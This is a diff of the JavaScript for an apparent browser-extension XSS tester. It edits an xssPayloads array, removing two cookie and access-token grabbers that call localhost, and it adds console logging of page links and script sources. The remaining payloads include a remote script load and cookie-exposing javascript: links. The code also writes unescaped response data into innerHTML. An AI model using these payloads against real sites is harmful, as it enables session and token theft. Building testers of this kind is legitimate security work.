@@ -62,8 +62,6 @@ document.addEventListener('DOMContentLoaded', function () {
     var xssPayloads = [
         '<script>alert("XSS attack");</script>',
         "<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>",
-        "<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>",
-        "<script>new Image().src='http://localhost/cookie.php?c='+localStorage.getItem('access_token');</script>",
         "[a](javascript:prompt(document.cookie))",
         "[a](javascript:window.onerror=alert;throw%201)",
         "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(document.domain)'/>",
@@ -144,20 +142,31 @@ document.addEventListener('DOMContentLoaded', function () {
         } else {
             alert('Please enter a valid website link.');
         }
+    
+        var allLinks = document.getElementsByTagName('a');
+        console.log('Anchor Hrefs:');
+        for (var i = 0; i < allLinks.length; i++) {
+            console.log(allLinks[i].href);
+        }
+
+        
+        var allScripts = document.getElementsByTagName('script');
+        console.log('\nScript Srcs:');
+        for (var i = 0; i < allScripts.length; i++) {
+            console.log(allScripts[i].src);
+        }
+
     });
 
     function fetchWebsiteInfo(websiteLink) {
         chrome.runtime.sendMessage({ action: 'fetchWebsiteInfo', websiteLink: websiteLink }, function (response) {
-            // Check if the response object is defined
             if (response && response.success) {
-                // Display the fetched information
                 resultContainer.innerHTML = `
                     <p><strong>Hyperlinks:</strong> ${response.hyperlinks.join(', ')}</p>
                     <p><strong>Sources:</strong> ${response.sources.join(', ')}</p>
                     <p><strong>Scripts:</strong> ${response.scripts.join(', ')}</p>
                 `;
             } else {
-                // Handle the case where the response object is not in the expected format
                 console.error('Error fetching website information:', response);
                 alert('Error fetching website information. Please check the link or try again.');
             }
